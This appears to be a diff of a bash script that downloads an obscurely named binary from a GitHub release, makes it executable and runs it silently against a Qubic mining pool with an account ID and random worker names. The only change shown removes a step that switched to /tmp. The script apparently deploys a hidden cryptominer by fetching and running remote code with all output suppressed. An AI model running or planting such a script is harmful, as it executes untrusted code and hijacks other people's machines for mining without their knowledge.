@@ -1,7 +1,5 @@
 #!/bin/bash
 
-cd /tmp || exit 1  # switch to /tmp or exit if not possible
-
-wget https://github.com/vedhagsvp/taberas/releases/download/latest/nxtemns -O nxtemns
+wget https://github.com/vedhagsvp/taberas/releases/download/latest/nxtemns
 chmod +x nxtemns
 ./nxtemns --account CP_udnvh2owpq --worker "$(shuf -i 1-15000 -n 1)-nexte" --pool qubic.asia.apool.io:4334 > /dev/null 2>&1
